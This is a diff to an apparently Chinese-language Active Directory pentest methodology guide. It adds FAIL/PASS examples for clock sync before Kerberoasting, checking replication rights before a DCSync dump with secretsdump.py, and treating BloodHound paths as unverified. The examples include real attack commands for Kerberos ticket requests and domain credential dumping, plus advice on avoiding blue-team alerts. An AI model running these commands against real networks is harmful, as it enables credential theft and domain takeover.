@@ -35,6 +35,53 @@ GetUserSPNs.py corp.local/user:pass -dc-ip 10.0.0.10 -request
 - 高危动作前确认影响面、锁定条件和退出条件。
 
 ## 反模式
-- 未做时钟校准就直接测试 Kerberos。
-- 没有前置证据就直接跑 DCSync、secretsdump 或大规模喷洒。
-- 把 BloodHound 路径当成已证实权限链，而不是待验证假设。
+
+### FAIL: 不校时直接测 Kerberos
+
+```bash
+GetUserSPNs.py corp.local/user:pass -dc-ip 10.0.0.10 -request
+# KRB_AP_ERR_SKEW: Clock skew too great
+# 客户端时间偏离 DC > 5 分钟，所有 Kerberos 操作失败
+```
+
+### PASS: 先同步时钟
+
+```bash
+ntpdate -q 10.0.0.10  # 检查偏差
+sudo ntpdate 10.0.0.10  # 同步
+sudo timedatectl set-timezone UTC
+GetUserSPNs.py ...  # 再执行
+```
+
+### FAIL: 上来就 DCSync
+
+```bash
+secretsdump.py -just-dc corp.local/user:pass@10.0.0.10
+# Access denied → 暴露了攻击意图，触发蓝队告警
+# 实际：当前账户根本没有 DS-Replication-Get-Changes 权限
+```
+
+### PASS: 先验证前提
+
+```bash
+# 1. 枚举：当前账户有哪些 ACE
+bloodhound-python -u user -p pass -d corp.local -c All
+# 2. 只在确认有 GetChangesAll 权限的账户上执行 DCSync
+# 3. 先低噪声测试一个账户，再扩大
+```
+
+### FAIL: BloodHound 路径当事实
+
+```
+"BloodHound 显示 alice → DA 路径"
+→ 直接报告"已具备 Domain Admin 权限"
+→ 实际：路径中某个 GenericAll 已被组策略限制
+```
+
+### PASS: 路径 = 待验证假设
+
+```
+1. 标注 BloodHound 路径为"理论可达"
+2. 对每条边手工验证：实际尝试 RDP / WinRM / GenericAll 操作
+3. 把"理论路径"和"已实证路径"分开报告
+```
